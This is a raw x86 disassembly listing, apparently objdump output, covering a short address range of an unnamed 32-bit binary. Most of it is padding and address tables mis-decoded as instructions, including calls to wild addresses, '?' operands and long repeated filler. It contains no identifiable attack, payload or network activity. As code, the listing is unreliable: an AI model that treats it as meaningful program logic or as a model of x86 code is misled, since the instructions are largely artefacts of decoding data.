  41a061:	add    al,0x89
  41a063:	push   ebp
  41a064:	push   edx
  41a065:	and    bh,cl
  41a067:	mov    edi,esp
  41a069:	pop    esp
  41a06a:	push   ebx
  41a06b:	inc    ecx
  41a06c:	cli    
  41a06d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a06e:	call   0x50465bc8
  41a073:	call   0x3eef76
  41a078:	jns    0x41a0c3
  41a07a:	add    al,0x8b
  41a07c:	neg    DWORD PTR [eax+0x53]
  41a07f:	inc    ecx
	...
  41a090:	add    BYTE PTR [eax],al
  41a092:	cli    
  41a093:	mov    ch,0xe7
  41a095:	aad    0x10
  41a097:	push   esp
  41a098:	std    
  41a099:	test   DWORD PTR [edx],edi
  41a09b:	fiadd  DWORD PTR [ebx]
  41a09d:	xor    edi,DWORD PTR [edx]
  41a09f:	pusha  
  41a0a0:	sub    cl,BYTE PTR [ebx+0x415368d7]
  41a0a6:	cli    
  41a0a7:	xchg   esp,eax
  41a0a9:	add    al,0x79
  41a0ab:	adc    eax,edi
  41a0ad:	push   ebp
  41a0ae:	cmp    eax,DWORD PTR ds:0xa5f37400
  41a0b4:	aam    0x55
  41a0b6:	cmp    eax,DWORD PTR ds:0x9164487
  41a0bc:	call   0xfd95681e
  41a0c1:	mov    esp,edi
  41a0c3:	clc    
  41a0c4:	push   ebp
  41a0c5:	inc    ecx
  41a0c6:	cli    
  41a0c7:	mov    dh,0xc0
  41a0c9:	xor    edi,DWORD PTR [edx-0x46a21c81]
  41a0cf:	inc    eax
  41a0d0:	int3   
  41a0d1:	int3   
  41a0d2:	cli    
  41a0d3:	add    al,0x0
  41a0d5:	add    dl,bh
  41a0d7:	add    al,0x0
  41a0d9:	add    dl,bh
  41a0db:	add    al,0x0
  41a0dd:	add    dl,bh
  41a0df:	add    al,0x0
  41a0e1:	add    dl,bh
  41a0e3:	add    al,0x0
  41a0e5:	add    dl,bh
  41a0e7:	add    al,0x0
  41a0e9:	add    dl,bh
  41a0eb:	add    al,0x0
  41a0ed:	add    dl,bh
  41a0ef:	add    al,0x0
  41a0f1:	add    dl,bh
  41a0f3:	add    al,0x0
	...
  41a105:	add    BYTE PTR [eax],al
  41a107:	add    dl,bh
  41a109:	add    al,0x0
  41a10b:	add    dl,bh
  41a10d:	add    al,0x0
  41a10f:	add    dl,bh
  41a111:	add    al,0x0
  41a113:	add    dl,bh
  41a115:	add    al,0x0
  41a117:	add    dl,bh
  41a119:	add    al,0x0
  41a11b:	add    dl,bh
  41a11d:	add    al,0x0
  41a11f:	add    dl,bh
  41a121:	add    al,0x0
  41a123:	add    dl,bh
  41a125:	add    al,0x0
  41a127:	add    dl,bh
  41a129:	add    al,0x0
  41a12b:	add    dl,bh
  41a12d:	add    al,0x0
  41a12f:	add    dl,bh
  41a131:	add    al,0x0
  41a133:	add    dl,bh
  41a135:	add    al,0x0
  41a137:	add    dl,bh
  41a139:	add    al,0x0
  41a13b:	add    dl,bh
  41a13d:	add    al,0x0
  41a13f:	add    dl,bh
  41a141:	add    al,0x0
  41a143:	add    dl,bh
  41a145:	add    al,0x0
  41a147:	add    dl,bh
  41a149:	add    al,0x0
  41a14b:	add    dl,bh
  41a14d:	add    al,0x0
  41a14f:	add    dl,bh
  41a151:	add    al,0x0
  41a153:	add    dl,bh
  41a155:	add    al,0x0
  41a157:	add    dl,bh
  41a159:	add    al,0x0
  41a15b:	add    dl,bh
  41a15d:	add    al,0x0
  41a15f:	add    dl,bh
  41a161:	add    al,0x0
  41a163:	add    dl,bh
  41a165:	add    al,0x0
  41a167:	add    dl,bh
  41a169:	add    al,0x0
	...
  41a17b:	add    BYTE PTR [eax],al
  41a17d:	add    dl,bh
  41a17f:	add    al,0x0
  41a181:	add    dl,bh
  41a183:	add    al,0x0
  41a185:	add    dl,bh
  41a187:	add    al,0x0
  41a189:	add    dl,bh
  41a18b:	add    al,0x0
  41a18d:	add    dl,bh
  41a18f:	add    al,0x0
  41a191:	add    dl,bh
  41a193:	add    al,0x0
  41a195:	add    dl,bh
  41a197:	add    al,0x0
  41a199:	add    dl,bh
  41a19b:	add    al,0x0
  41a19d:	add    dl,bh
  41a19f:	add    al,0x0
  41a1a1:	add    dl,bh
  41a1a3:	add    al,0x0
  41a1a5:	add    dl,bh
  41a1a7:	add    al,0x0
  41a1a9:	add    dl,bh
  41a1ab:	add    al,0x0
  41a1ad:	add    dl,bh
  41a1af:	add    al,0x0
  41a1b1:	add    dl,bh
  41a1b3:	add    al,0x0
  41a1b5:	add    dl,bh
  41a1b7:	add    al,0x0
  41a1b9:	add    dl,bh
  41a1bb:	add    al,0x0
  41a1bd:	add    dl,bh
  41a1bf:	add    al,0x0
  41a1c1:	add    dl,bh
  41a1c3:	add    al,0x0
  41a1c5:	add    dl,bh
  41a1c7:	add    al,0x0
  41a1c9:	add    dl,bh
  41a1cb:	add    al,0x0
  41a1cd:	add    dl,bh
  41a1cf:	add    al,0x0
  41a1d1:	add    dl,bh
  41a1d3:	add    al,0x0
  41a1d5:	add    dl,bh
  41a1d7:	add    al,0x0
  41a1d9:	add    dl,bh
  41a1db:	add    al,0x0
  41a1dd:	add    dl,bh
  41a1df:	add    al,0x0
	...
  41a1f1:	add    BYTE PTR [eax],al
  41a1f3:	add    dl,bh
  41a1f5:	add    al,0x0
  41a1f7:	add    dl,bh
  41a1f9:	add    al,0x0
  41a1fb:	add    dl,bh
  41a1fd:	add    al,0x0
  41a1ff:	add    dl,bh
  41a201:	add    al,0x0
  41a203:	add    dl,bh
  41a205:	add    al,0x0
  41a207:	add    dl,bh
  41a209:	add    al,0x0
  41a20b:	add    dl,bh
  41a20d:	add    al,0x0
  41a20f:	add    dl,bh
  41a211:	add    al,0x0
  41a213:	add    dl,bh
  41a215:	add    al,0x0
  41a217:	add    dl,bh
  41a219:	add    al,0x0
  41a21b:	add    dl,bh
  41a21d:	add    al,0x0
  41a21f:	add    dl,bh
  41a221:	add    al,0x0
  41a223:	add    dl,bh
  41a225:	add    al,0x0
  41a227:	add    dl,bh
  41a229:	add    al,0x0
  41a22b:	add    dl,bh
  41a22d:	add    al,0x0
  41a22f:	add    dl,bh
  41a231:	add    al,0x0
  41a233:	add    dl,bh
  41a235:	add    al,0x0
  41a237:	add    dl,bh
  41a239:	add    al,0x0
  41a23b:	add    dl,bh
  41a23d:	add    al,0x0
  41a23f:	add    dl,bh
  41a241:	add    al,0x0
  41a243:	add    dl,bh
  41a245:	add    al,0x0
  41a247:	add    dl,bh
  41a249:	add    al,0x0
  41a24b:	add    dl,bh
  41a24d:	add    al,0x0
  41a24f:	add    dl,bh
  41a251:	add    al,0x0
  41a253:	add    BYTE PTR [eax],al
  41a255:	add    al,BYTE PTR [eax]
  41a257:	add    dl,bh
  41a259:	add    al,0x0
  41a25b:	add    dl,ah
  41a25d:	add    al,0x0
  41a25f:	add    BYTE PTR [esi-0x79cd6fc9],al
  41a265:	aaa    
  41a266:	cwde   
  41a267:	xor    al,BYTE PTR [esi-0x69cd5fc9]
  41a26d:	aaa    
  41a26e:	test   al,0x32
  41a270:	cli    
  41a271:	inc    esp
  41a272:	add    DWORD PTR [eax],eax
  41a274:	sub    al,BYTE PTR ds:0x3fd90000
  41a27a:	dec    ebx
  41a27b:	cmp    ebp,DWORD PTR [edx]
  41a27d:	ds pop edx
  41a27f:	cmp    edx,DWORD PTR [ebp+0x3e]
  41a282:	push   0x933e1c3b
  41a287:	cmp    eax,DWORD PTR [esi+edi*1+0x3eb63ba8]
  41a28e:	in     eax,dx
  41a28f:	cmp    eax,DWORD PTR [ecx]
  41a291:	cmp    DWORD PTR [ecx],edx
  41a293:	cmp    al,0xf3
  41a295:	cmp    BYTE PTR [ebp-0x78c7a1c4],bl
  41a29b:	outs   dx,DWORD PTR ds:[esi]
  41a29d:	cmp    edx,DWORD PTR [ebp-0x32c4c1c2]
  41a2a3:	ds push ebp
  41a2a5:	cmp    edi,DWORD PTR [esi+0x3f]
  41a2a8:	jns    0x41a2e4
  41a2aa:	fwait
  41a2ab:	aas    
  41a2ac:	xchg   ebx,eax
  41a2ad:	cmp    ch,BYTE PTR [edi-0x33c56ac1]
  41a2b3:	aas    
  41a2b4:	sub    BYTE PTR [edx],bh
  41a2b6:	out    0x3f,al
  41a2b8:	dec    ebx
  41a2b9:	cmp    bh,cl
  41a2bb:	aas    
	...
  41a2cc:	add    BYTE PTR [eax],al
  41a2ce:	cmp    eax,0xfa00003a
  41a2d3:	push   esp
  41a2d4:	add    DWORD PTR [eax],eax
  41a2d6:	add    ax,0x0
  41a2da:	push   DWORD PTR [eax+ebx*1]
  41a2dd:	xor    BYTE PTR [ebx+0x35],bh
  41a2e0:	xchg   DWORD PTR [eax],esi
  41a2e2:	mov    esp,0xaf314b33
  41a2e7:	xor    esp,DWORD PTR [esi+0x31]
  41a2ea:	mov    dh,BYTE PTR [ebx]
  41a2ec:	lea    esi,[ecx]
  41a2ee:	push   esi
  41a2ef:	xor    al,0xaa
  41a2f1:	xor    DWORD PTR [eax-0x3ce1ecd],edi
  41a2f7:	ss pop ss
  41a2f9:	xor    al,BYTE PTR [esi]
  41a2fb:	aaa    
  41a2fc:	and    esi,DWORD PTR [edx]
  41a2fe:	and    esi,DWORD PTR [edi]
  41a300:	inc    edx
  41a301:	xor    al,BYTE PTR [edx+0x37]
  41a304:	push   ecx
  41a305:	xor    ah,BYTE PTR ds:0x57325e37
  41a30b:	aaa    
  41a30c:	jge    0x41a340
  41a30e:	js     0x41a346
  41a310:	xchg   esp,eax
  41a311:	xor    dl,BYTE PTR [edi+0x6432a736]
  41a317:	ss ret 0xca32
  41a31b:	or     BYTE PTR ss:[ebx],dh
  41a31e:	in     al,dx
  41a31f:	xor    eax,0x35df3314
  41a324:	sub    dh,BYTE PTR [ebx]
  41a326:	cmp    BYTE PTR [esi],dh
  41a328:	jle    0x41a35d
  41a32a:	jb     0x41a361
  41a32c:	xchg   ebp,eax
  41a32d:	xor    ebx,DWORD PTR [ebx+0x35]
  41a330:	stos   DWORD PTR es:[edi],eax
  41a331:	xor    eax,DWORD PTR [eax]
	...
  41a343:	add    BYTE PTR [esi+0x4333be35],ch
  41a349:	xor    eax,0x354e33ce
  41a34e:	fnsave [ebx]
  41a350:	dec    ebp
  41a351:	xor    eax,0x355033f4
  41a356:	push   DWORD PTR [ebx]
  41a358:	div    DWORD PTR [eax]
  41a35a:	or     DWORD PTR [esp+esi*8],esi
  41a35d:	xor    BYTE PTR [esp+esi*1],dl
  41a360:	sbb    BYTE PTR [ecx],dh
  41a362:	sub    BYTE PTR [edi+eiz*8],dh
  41a365:	xor    BYTE PTR [edx],dh
  41a367:	xor    al,0xbd
  41a369:	xor    BYTE PTR [edx+0x34],bl
  41a36c:	jl     0x41a39e
  41a36e:	mov    WORD PTR [eax+ecx*4],?
  41a371:	xor    BYTE PTR [esp+esi*1+0x34eb303c],bl
  41a378:	adc    dh,BYTE PTR [eax]
  41a37a:	or     al,0x35
  41a37c:	in     al,dx
  41a37d:	das    
  41a37e:	and    esi,DWORD PTR ds:0x35312fd3
  41a384:	xor    esi,DWORD PTR [edx]
  41a386:	inc    esp
  41a387:	xor    eax,0x355d323e
  41a38c:	pop    eax
  41a38d:	xor    dh,BYTE PTR [ecx+0x35]
  41a390:	ja     0x41a3c4
  41a392:	mov    ?,WORD PTR ds:0x35a5326c
  41a398:	cli    
  41a399:	add    al,0x0
  41a39b:	add    dl,bh
  41a39d:	add    al,0x0
  41a39f:	add    dl,bh
  41a3a1:	add    al,0x0
  41a3a3:	add    dl,bh
  41a3a5:	add    al,0x0
	...
  41a3b7:	add    BYTE PTR [eax],al
  41a3b9:	add    dl,bh
  41a3bb:	add    al,0x0
  41a3bd:	add    dl,bh
  41a3bf:	add    al,0x0
  41a3c1:	add    dl,bh
  41a3c3:	add    al,0x0
  41a3c5:	add    dl,bh
  41a3c7:	add    al,0x0
  41a3c9:	add    dl,bh
  41a3cb:	add    al,0x0
  41a3cd:	add    dl,bh
  41a3cf:	add    al,0x0
  41a3d1:	add    dl,bh
  41a3d3:	add    al,0x0
  41a3d5:	add    dl,bh
  41a3d7:	add    al,0x0
  41a3d9:	add    dl,bh
  41a3db:	add    al,0x0
  41a3dd:	add    dl,bh
  41a3df:	add    al,0x0
  41a3e1:	add    dl,bh
  41a3e3:	add    al,0x0
  41a3e5:	add    dl,bh
  41a3e7:	add    al,0x0
  41a3e9:	add    dl,bh
  41a3eb:	add    al,0x0
  41a3ed:	add    dl,bh
  41a3ef:	add    al,0x0
  41a3f1:	add    dl,bh
  41a3f3:	add    al,0x0
  41a3f5:	add    dl,bh
  41a3f7:	add    al,0x0
  41a3f9:	add    dl,bh
  41a3fb:	add    al,0x0
  41a3fd:	add    dl,bh
  41a3ff:	add    al,0x0
  41a401:	add    dl,bh
  41a403:	add    al,0x0
  41a405:	add    dl,bh
  41a407:	add    al,0x0
  41a409:	add    dl,bh
  41a40b:	add    al,0x0
  41a40d:	add    dl,bh
  41a40f:	add    al,0x0
  41a411:	add    dl,bh
  41a413:	add    al,0x0
  41a415:	add    dl,bh
  41a417:	add    al,0x0
  41a419:	add    dl,bh
  41a41b:	add    al,0x0
	...
  41a42d:	add    BYTE PTR [eax],al
  41a42f:	add    dl,bh
  41a431:	add    al,0x0
  41a433:	add    dl,bh
  41a435:	add    al,0x0
  41a437:	add    dl,bh
  41a439:	add    al,0x0
  41a43b:	add    dl,bh
  41a43d:	add    al,0x0
  41a43f:	add    dl,bh
  41a441:	add    al,0x0
  41a443:	add    dl,bh
  41a445:	add    al,0x0
  41a447:	add    dl,bh
  41a449:	add    al,0x0
  41a44b:	add    dl,bh
  41a44d:	add    al,0x0
  41a44f:	add    dl,bh
  41a451:	add    al,0x0
  41a453:	add    dl,bh
  41a455:	add    al,0x0
  41a457:	add    dl,bh
  41a459:	add    al,0x0
  41a45b:	add    dl,bh
  41a45d:	add    al,0x0
  41a45f:	add    dl,bh
  41a461:	add    al,0x0
  41a463:	add    dl,bh
  41a465:	add    al,0x0
  41a467:	add    dl,bh
  41a469:	add    al,0x0
  41a46b:	add    dl,bh
  41a46d:	add    al,0x0
  41a46f:	add    dl,bh
  41a471:	add    al,0x0
  41a473:	add    dl,bh
  41a475:	add    al,0x0
  41a477:	add    dl,bh
  41a479:	add    al,0x0
  41a47b:	add    dl,bh
  41a47d:	add    al,0x0
  41a47f:	add    dl,bh
  41a481:	add    al,0x0
  41a483:	add    dl,bh
  41a485:	add    al,0x0
  41a487:	add    dl,bh
  41a489:	add    al,0x0
  41a48b:	add    dl,bh
  41a48d:	add    al,0x0
  41a48f:	add    dl,bh
  41a491:	add    al,0x0
	...
  41a4a3:	add    BYTE PTR [eax],al
  41a4a5:	add    dl,bh
  41a4a7:	add    al,0x0
  41a4a9:	add    dl,bh
  41a4ab:	add    al,0x0
  41a4ad:	add    dl,bh
  41a4af:	add    al,0x0
  41a4b1:	add    BYTE PTR [eax-0x26],dh
  41a4b4:	inc    ecx
  41a4b5:	add    BYTE PTR [edx+ebx*8+0x41],dh
  41a4b9:	add    BYTE PTR [eax-0x26],bh
  41a4bc:	inc    ecx
  41a4bd:	add    BYTE PTR [edx+ebx*8+0x41],bh
  41a4c1:	add    BYTE PTR [eax-0x7bffbe26],al
  41a4c7:	fiadd  DWORD PTR [ecx+0x0]
  41a4ca:	mov    dl,bl
  41a4cc:	inc    ecx
  41a4cd:	add    BYTE PTR [edx+ebx*8-0x256fffbf],cl
  41a4d4:	inc    ecx
  41a4d5:	add    BYTE PTR [edx+ebx*8-0x2567ffbf],dl
  41a4dc:	inc    ecx
  41a4dd:	add    BYTE PTR [edx+ebx*8-0x255fffbf],bl
  41a4e4:	inc    ecx
  41a4e5:	add    BYTE PTR [edx+ebx*8-0x2557ffbf],ah
  41a4ec:	inc    ecx
  41a4ed:	add    BYTE PTR [edx+ebx*8-0x254fffbf],ch
  41a4f4:	inc    ecx
  41a4f5:	add    BYTE PTR [edx+ebx*8-0x2547ffbf],dh
  41a4fc:	inc    ecx
  41a4fd:	add    BYTE PTR [edx+ebx*8-0x253fffbf],bh
  41a504:	inc    ecx
  41a505:	add    ah,al
  41a507:	fiadd  DWORD PTR [ecx+0x0]
  41a50a:	enter  0x41da,0x0
  41a50e:	int3   
  41a50f:	fiadd  DWORD PTR [ecx+0x0]
  41a512:	rcr    dl,1
  41a514:	inc    ecx
  41a515:	add    ah,dl
  41a517:	fiadd  DWORD PTR [ecx+0x0]
  41a51a:	fcomp  st(2)
  41a51c:	inc    ecx
  41a51d:	add    ah,bl
  41a51f:	fiadd  DWORD PTR [ecx+0x0]
  41a522:	loopne 0x41a4fe
  41a524:	inc    ecx
  41a525:	add    ah,ah
  41a527:	fiadd  DWORD PTR [ecx+0x0]
  41a52a:	call   0xec41e709
  41a52f:	fiadd  DWORD PTR [ecx+0x0]
  41a532:	lock fiadd DWORD PTR [ecx+0x0]
  41a536:	hlt    
  41a537:	fiadd  DWORD PTR [ecx+0x0]
  41a53a:	clc    
  41a53b:	fiadd  DWORD PTR [ecx+0x0]
  41a53e:	cld    
  41a53f:	fiadd  DWORD PTR [ecx+0x0]
  41a542:	add    bl,bl
  41a544:	inc    ecx
  41a545:	add    BYTE PTR [ebx+ebx*8],al
  41a548:	inc    ecx
  41a549:	add    BYTE PTR [eax],cl
  41a54b:	fild   DWORD PTR [ecx+0x0]
  41a54e:	jo     0x41a52a
  41a550:	inc    ecx
  41a551:	add    BYTE PTR [ebx+ebx*8],cl
  41a554:	inc    ecx
  41a555:	add    BYTE PTR [eax],dl
  41a557:	fild   DWORD PTR [ecx+0x0]
  41a55a:	adc    al,0xdb
  41a55c:	inc    ecx
  41a55d:	add    BYTE PTR [eax],bl
  41a55f:	fild   DWORD PTR [ecx+0x0]
  41a562:	sbb    al,0xdb
  41a564:	inc    ecx
  41a565:	add    BYTE PTR [eax],ah
  41a567:	fild   DWORD PTR [ecx+0x0]
  41a56a:	and    al,0xdb
  41a56c:	inc    ecx
  41a56d:	add    BYTE PTR [eax],ch
  41a56f:	fild   DWORD PTR [ecx+0x0]
  41a572:	sub    al,0xdb
  41a574:	inc    ecx
  41a575:	add    BYTE PTR [eax],dh
  41a577:	fild   DWORD PTR [ecx+0x0]
  41a57a:	xor    al,0xdb
  41a57c:	inc    ecx
  41a57d:	add    BYTE PTR [eax],bh
  41a57f:	fild   DWORD PTR [ecx+0x0]
  41a582:	cmp    al,0xdb
  41a584:	inc    ecx
  41a585:	add    BYTE PTR [eax-0x25],al
  41a588:	inc    ecx
  41a589:	add    BYTE PTR [ebx+ebx*8+0x41],al
  41a58d:	add    BYTE PTR [eax-0x25],cl
  41a590:	inc    ecx
  41a591:	add    BYTE PTR [ebx+ebx*8+0x41],cl
  41a595:	add    BYTE PTR [eax-0x25],dl
  41a598:	inc    ecx
  41a599:	add    BYTE PTR [ebx+ebx*8+0x41],dl
  41a59d:	add    BYTE PTR [eax-0x25],bl
  41a5a0:	inc    ecx
  41a5a1:	add    BYTE PTR [ebx+ebx*8+0x41],bl
  41a5a5:	add    BYTE PTR [eax-0x25],ah
  41a5a8:	inc    ecx
  41a5a9:	add    BYTE PTR [ebx+ebx*8+0x41],ah
  41a5ad:	add    BYTE PTR [eax-0x25],ch
  41a5b0:	inc    ecx
  41a5b1:	add    BYTE PTR [ebx+ebx*8+0x41],ch
  41a5b5:	add    BYTE PTR [eax-0x25],dh
  41a5b8:	inc    ecx
  41a5b9:	add    BYTE PTR [ebx+ebx*8+0x41],dh
  41a5bd:	add    BYTE PTR [eax-0x25],bh
  41a5c0:	inc    ecx
  41a5c1:	add    BYTE PTR [ebx+ebx*8+0x41],bh
  41a5c5:	add    BYTE PTR [eax-0x7bffbe25],al
  41a5cb:	fild   DWORD PTR [ecx+0x0]
  41a5ce:	mov    bl,bl
  41a5d0:	inc    ecx
  41a5d1:	add    BYTE PTR [ebx+ebx*8-0x246fffbf],cl
  41a5d8:	inc    ecx
  41a5d9:	add    BYTE PTR [ebx+ebx*8-0x2467ffbf],dl
  41a5e0:	inc    ecx
  41a5e1:	add    BYTE PTR [ebx+ebx*8-0x245fffbf],bl
  41a5e8:	inc    ecx
  41a5e9:	add    BYTE PTR [ebx+ebx*8-0x2457ffbf],ah
  41a5f0:	inc    ecx
  41a5f1:	add    BYTE PTR [ebx+ebx*8-0x244fffbf],ch
  41a5f8:	inc    ecx
  41a5f9:	add    BYTE PTR [ebx+ebx*8-0x2467ffbf],dh
  41a600:	inc    ecx
  41a601:	add    BYTE PTR [eax-0x43ffbe25],bh
  41a607:	fild   DWORD PTR [ecx+0x0]
  41a60a:	pusha  
  41a60b:	fild   DWORD PTR [ecx+0x0]
  41a60e:	rcr    bl,0x41
  41a611:	add    ah,al
  41a613:	fild   DWORD PTR [ecx+0x0]
  41a616:	enter  0x41db,0x0
  41a61a:	lock fiadd DWORD PTR [ecx+0x0]
  41a61e:	int3   
  41a61f:	fild   DWORD PTR [ecx+0x0]
  41a622:	pop    esp
  41a623:	fild   DWORD PTR [ecx+0x0]
  41a626:	rcr    bl,1
  41a628:	inc    ecx
  41a629:	add    ah,dl
  41a62b:	fild   DWORD PTR [ecx+0x0]
  41a62e:	lock fiadd DWORD PTR [ecx+0x0]
  41a632:	fcomp  st(3)
  41a634:	inc    ecx
  41a635:	add    ah,bl
  41a637:	fild   DWORD PTR [ecx+0x0]
  41a63a:	mov    al,ds:0xe00041db
  41a63f:	fild   DWORD PTR [ecx+0x0]
  41a642:	in     al,0xdb
  41a644:	inc    ecx
  41a645:	add    ah,ah
  41a647:	fild   DWORD PTR [ecx+0x0]
  41a64a:	call   0xec41e82a
  41a64f:	fild   DWORD PTR [ecx+0x0]
  41a652:	lock fild DWORD PTR [ecx+0x0]
  41a656:	hlt    
  41a657:	fild   DWORD PTR [ecx+0x0]
  41a65a:	clc    
  41a65b:	fild   DWORD PTR [ecx+0x0]
  41a65e:	rcr    dl,1
  41a660:	inc    ecx
  41a661:	add    ah,bh
  41a663:	fild   DWORD PTR [ecx+0x0]
  41a666:	add    ah,bl
  41a668:	inc    ecx
  41a669:	add    BYTE PTR [esp+ebx*8],al
  41a66c:	inc    ecx
  41a66d:	add    BYTE PTR [eax],cl
  41a66f:	fadd   QWORD PTR [ecx+0x0]
  41a672:	or     al,0xdc
  41a674:	inc    ecx
  41a675:	add    BYTE PTR [eax],dl
  41a677:	fadd   QWORD PTR [ecx+0x0]
  41a67a:	adc    al,0xdc
  41a67c:	inc    ecx
  41a67d:	add    BYTE PTR [eax],bl
  41a67f:	fadd   QWORD PTR [ecx+0x0]
  41a682:	sbb    al,0xdc
  41a684:	inc    ecx
  41a685:	add    ah,al
  41a687:	fiadd  DWORD PTR [ecx+0x0]
  41a68a:	and    ah,bl
  41a68c:	inc    ecx
  41a68d:	add    ah,ah
  41a68f:	fiadd  DWORD PTR [ecx+0x0]
  41a692:	and    al,0xdc
  41a694:	inc    ecx
  41a695:	add    BYTE PTR [eax],ch
  41a697:	fadd   QWORD PTR [ecx+0x0]
  41a69a:	test   al,0xda
  41a69c:	inc    ecx
  41a69d:	add    BYTE PTR [esp+ebx*8],ch
  41a6a0:	inc    ecx
  41a6a1:	add    BYTE PTR [eax],dh
  41a6a3:	fadd   QWORD PTR [ecx+0x0]
  41a6a6:	xor    al,0xdc
  41a6a8:	inc    ecx
  41a6a9:	add    BYTE PTR [eax],bh
  41a6ab:	fadd   QWORD PTR [ecx+0x0]
  41a6ae:	cmp    al,0xdc
  41a6b0:	inc    ecx
  41a6b1:	add    BYTE PTR [eax-0x24],al
  41a6b4:	inc    ecx
  41a6b5:	add    BYTE PTR [esp+ebx*8+0x41],al
  41a6b9:	add    BYTE PTR [eax-0x24],cl
  41a6bc:	inc    ecx
  41a6bd:	add    BYTE PTR [esp+ebx*8+0x41],cl
  41a6c1:	add    BYTE PTR [eax-0x24],dl
  41a6c4:	inc    ecx
  41a6c5:	add    BYTE PTR [esp+ebx*8+0x41],dl
  41a6c9:	add    BYTE PTR [eax-0x24],bl
  41a6cc:	inc    ecx
  41a6cd:	add    BYTE PTR [edx+ebx*8-0x23a3ffbf],al
  41a6d4:	inc    ecx
  41a6d5:	add    BYTE PTR [eax-0x24],ah
  41a6d8:	inc    ecx
  41a6d9:	add    BYTE PTR [esp+ebx*8+0x41],ah
  41a6dd:	add    BYTE PTR [eax-0x24],ch
  41a6e0:	inc    ecx
  41a6e1:	add    BYTE PTR [esp+ebx*8+0x41],ch
  41a6e5:	add    al,al
  41a6e7:	fild   DWORD PTR [ecx+0x0]
  41a6ea:	jo     0x41a6c8
  41a6ec:	inc    ecx
  41a6ed:	add    BYTE PTR [esp+ebx*8+0x41],dh
  41a6f1:	add    BYTE PTR [eax-0x24],bh
  41a6f4:	inc    ecx
  41a6f5:	add    BYTE PTR [esp+ebx*8+0x41],bh
  41a6f9:	add    BYTE PTR [eax-0x7bffbe24],al
  41a6ff:	fadd   QWORD PTR [ecx+0x0]
  41a702:	mov    ah,bl
  41a704:	inc    ecx
  41a705:	add    BYTE PTR [eax-0x73ffbe26],ah
  41a70b:	fadd   QWORD PTR [ecx+0x0]
  41a70e:	nop
  41a70f:	fadd   QWORD PTR [ecx+0x0]
  41a712:	pop    eax
  41a713:	fadd   QWORD PTR [ecx+0x0]
  41a716:	nop
  41a717:	fild   DWORD PTR [ecx+0x0]
  41a71a:	xchg   esp,eax
  41a71b:	fadd   QWORD PTR [ecx+0x0]
  41a71e:	cwde   
  41a71f:	fadd   QWORD PTR [ecx+0x0]
  41a722:	pushf  
  41a723:	fadd   QWORD PTR [ecx+0x0]
  41a726:	mov    al,ds:0xa40041dc
  41a72b:	fadd   QWORD PTR [ecx+0x0]
  41a72e:	test   al,0xdc
  41a730:	inc    ecx
  41a731:	add    BYTE PTR [esp+ebx*8-0x234fffbf],ch
  41a738:	inc    ecx
  41a739:	add    BYTE PTR [eax-0x4bffbe20],dh
  41a73f:	loopne 0x41a782
  41a741:	add    BYTE PTR [eax-0x43ffbe20],bh
  41a747:	loopne 0x41a78a
  41a749:	add    al,al
  41a74b:	loopne 0x41a78e
  41a74d:	add    ah,al
  41a74f:	loopne 0x41a792
  41a751:	add    al,cl
  41a753:	loopne 0x41a796
  41a755:	add    ah,cl
  41a757:	loopne 0x41a79a
  41a759:	add    al,dl
  41a75b:	loopne 0x41a79e
  41a75d:	add    ah,dl
  41a75f:	loopne 0x41a7a2
  41a761:	add    ah,cl
  41a763:	loopne 0x41a7a6
  41a765:	add    al,bl
  41a767:	loopne 0x41a7aa
  41a769:	add    ah,bl
  41a76b:	loopne 0x41a7ae
  41a76d:	add    al,ah
  41a76f:	loopne 0x41a7b2
  41a771:	add    al,cl
  41a773:	loopne 0x41a7b6
  41a775:	add    ah,ah
  41a777:	loopne 0x41a7ba
  41a779:	add    al,ch
  41a77b:	loopne 0x41a7be
  41a77d:	add    ah,ch
  41a77f:	loopne 0x41a7c2
  41a781:	add    al,dh
  41a783:	loopne 0x41a7c6
  41a785:	add    ah,dh
  41a787:	loopne 0x41a7ca
  41a789:	add    al,bh
  41a78b:	loopne 0x41a7ce
  41a78d:	add    ah,bh
  41a78f:	loopne 0x41a7d2
  41a791:	add    BYTE PTR [eax],al
  41a793:	loope  0x41a7d6
  41a795:	add    BYTE PTR [ecx+eiz*8],al
  41a798:	inc    ecx
  41a799:	add    BYTE PTR [eax],cl
  41a79b:	loope  0x41a7de
  41a79d:	add    BYTE PTR [ecx+eiz*8],cl
  41a7a0:	inc    ecx
  41a7a1:	add    BYTE PTR [eax],dl
  41a7a3:	loope  0x41a7e6
  41a7a5:	add    BYTE PTR [ecx+eiz*8],dl
  41a7a8:	inc    ecx
  41a7a9:	add    BYTE PTR [eax],bl
  41a7ab:	loope  0x41a7ee
  41a7ad:	add    BYTE PTR [ecx+eiz*8],bl
  41a7b0:	inc    ecx
  41a7b1:	add    BYTE PTR [eax],ah
  41a7b3:	loope  0x41a7f6
  41a7b5:	add    BYTE PTR [ecx+eiz*8],ah
  41a7b8:	inc    ecx
  41a7b9:	add    BYTE PTR [eax],ch
  41a7bb:	loope  0x41a7fe
  41a7bd:	add    BYTE PTR [ecx+eiz*8],ch
  41a7c0:	inc    ecx
  41a7c1:	add    BYTE PTR [eax],dh
  41a7c3:	loope  0x41a806
  41a7c5:	add    BYTE PTR [ecx+eiz*8],dh
  41a7c8:	inc    ecx
  41a7c9:	add    BYTE PTR [eax],bh
  41a7cb:	loope  0x41a80e
  41a7cd:	add    BYTE PTR [ecx+eiz*8],bh
  41a7d0:	inc    ecx
  41a7d1:	add    BYTE PTR [eax-0x1f],al
  41a7d4:	inc    ecx
  41a7d5:	add    BYTE PTR [ecx+eiz*8+0x41],al
  41a7d9:	add    BYTE PTR [eax-0x1f],cl
  41a7dc:	inc    ecx
  41a7dd:	add    BYTE PTR [ecx+eiz*8+0x41],cl
  41a7e1:	add    BYTE PTR [eax-0x1f],dl
  41a7e4:	inc    ecx
  41a7e5:	add    BYTE PTR [ecx+eiz*8+0x41],dl
  41a7e9:	add    BYTE PTR [eax-0x1f],bl
  41a7ec:	inc    ecx
  41a7ed:	add    BYTE PTR [ecx+eiz*8+0x41],bl
  41a7f1:	add    BYTE PTR [eax-0x1f],ah
  41a7f4:	inc    ecx
  41a7f5:	add    BYTE PTR [ecx+eiz*8+0x41],ah
  41a7f9:	add    BYTE PTR [eax-0x1f],ch
  41a7fc:	inc    ecx
  41a7fd:	add    BYTE PTR [ecx+eiz*8+0x41],ch
  41a801:	add    BYTE PTR [eax-0x1f],dh
  41a804:	inc    ecx
  41a805:	add    BYTE PTR [ecx+eiz*8+0x41],dh
  41a809:	add    BYTE PTR [eax-0x1f],bh
  41a80c:	inc    ecx
  41a80d:	add    BYTE PTR [ecx+eiz*8+0x41],bh
